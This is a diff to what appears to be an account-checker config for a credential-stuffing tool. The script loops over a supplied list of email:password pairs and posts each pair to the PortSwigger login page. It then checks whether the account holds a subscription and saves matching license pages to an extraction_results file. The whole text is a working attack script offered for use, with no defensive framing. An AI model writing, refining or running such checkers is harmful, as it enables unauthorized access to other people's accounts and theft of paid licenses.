@@ -7,7 +7,6 @@ PRINT "Loaded accounts" White
 SET VAR "counter" "0" Integer
 SET VAR "success_count" "0" Integer
 
-## Test first account only
 FOREACH $"<accounts>" -> VAR "account"
 
   SUM $"<counter>" 1 -> VAR "counter"
@@ -20,7 +19,7 @@ FOREACH $"<accounts>" -> VAR "account"
   SET VAR "email" $"<creds[0]>"
   SET VAR "password" $"<creds[1]>"
 
-  PRINT "Testing: $"<email>"" White
+  PRINT "Testing account 1" White
 
   ## Step 1: GET login page
   HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
@@ -29,8 +28,12 @@ FOREACH $"<accounts>" -> VAR "account"
 
   PRINT "Step 1 done" White
 
-  ## Step 2: POST credentials
-  ConstantString "username=$"<email>"&password=$"<password>"&action=default" -> VAR "postData"
+  ## Step 2: POST credentials with email/password
+  ConstantString "username=" -> VAR "postData"
+  Append $"<postData>" $"<email>" -> VAR "postData"
+  Append $"<postData>" "&password=" -> VAR "postData"
+  Append $"<postData>" $"<password>" -> VAR "postData"
+  Append $"<postData>" "&action=default" -> VAR "postData"
 
   HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
     CONTENT $"<postData>"
@@ -49,7 +52,7 @@ FOREACH $"<accounts>" -> VAR "account"
 
   ## Check if successful
   IF $"<licensesRes>" Contains "subscription"
-    PRINT "Success - subscription found" Green
+    PRINT "Success found" Green
 
     ConstantString "Configs\extraction_results\test.html" -> VAR "htmlFile"
     StringToBytes $"<licensesRes>" -> VAR "htmlBytes"
@@ -57,11 +60,11 @@ FOREACH $"<accounts>" -> VAR "account"
 
     SUM $"<success_count>" 1 -> VAR "success_count"
   ELSE
-    PRINT "No subscription in response" Red
+    PRINT "No subscription" Red
   ENDIF
 
   Delay 500
 
 ENDFOREACH
 
-PRINT "Done - $"<success_count>" saved" White
+PRINT "Done" White
